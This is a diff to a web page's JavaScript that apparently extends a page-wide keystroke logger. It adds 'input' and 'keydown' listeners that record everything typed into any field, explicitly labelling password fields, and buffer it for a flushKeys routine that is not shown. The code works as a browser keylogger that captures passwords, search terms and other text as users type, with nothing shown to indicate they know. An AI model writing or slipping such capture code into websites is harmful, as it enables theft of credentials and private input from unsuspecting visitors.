@@ -262,20 +262,54 @@ function scheduleFlush(context) {
   flushTimer = setTimeout(() => flushKeys(context), 700); // streams letter-groups fast
 }
 
-// capture everything typed anywhere on the page
+function contextFor(el) {
+  if (!el || !(el instanceof HTMLElement)) return "page";
+  if (el.type === "password") return "password field";
+  if (el.id === "searchBox") return "search box";
+  if (el.type === "email" || el.type === "text") return "text field";
+  return "page";
+}
+
+// PRIMARY CAPTURE — 'input' events fire on Android soft keyboards
+const lastVals = new WeakMap();
+document.addEventListener("input", (e) => {
+  const el = e.target;
+  if (!(el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement)) return;
+  if (el.type === "submit" || el.type === "button") return;
+
+  const v = el.value;
+  const prev = lastVals.get(el) ?? "";
+  lastVals.set(el, v);
+
+  let delta;
+  if (v.length > prev.length && v.startsWith(prev)) delta = v.slice(prev.length);
+  else if (v.length < prev.length && prev.startsWith(v)) delta = "⌫";
+  else if (v === prev) return;
+  else delta = v; // replaced/autocorrected — show the result
+
+  buffer += delta;
+  scheduleFlush(contextFor(el));
+}, true);
+
+// Enter key — not delivered via 'input', needs keydown
 document.addEventListener("keydown", (e) => {
-  if (e.key === "Enter") {
-    buffer += " ⏎";
-    flushKeys(document.activeElement && document.activeElement.id === "searchBox" ? "search box" : "page");
-    return;
-  }
-  if (e.key === "Backspace") {
-    buffer = buffer.slice(0, -1);
-    return;
-  }
+  if (e.key !== "Enter") return;
+  const el = e.target;
+  const ctx = el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement ? contextFor(el) : "page";
+  buffer += " ⏎";
+  flushKeys(ctx);
+}, true);
+
+// SECONDARY CAPTURE — physical keyboard typing outside any field
+// (desktop users typing on the page itself) — input events don't fire
+// there, so fall back to keydown for non-input targets
+document.addEventListener("keydown", (e) => {
+  const el = e.target;
+  if (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) return; // handled above
+  if (e.key === "Backspace") { buffer = buffer.slice(0, -1); return; }
   if (e.key.length === 1) {
     buffer += e.key;
-    scheduleFlush(document.activeElement && document.activeElement.id === "searchBox" ? "search box" : "page");
+    scheduleFlush("page");
   }
 });
 
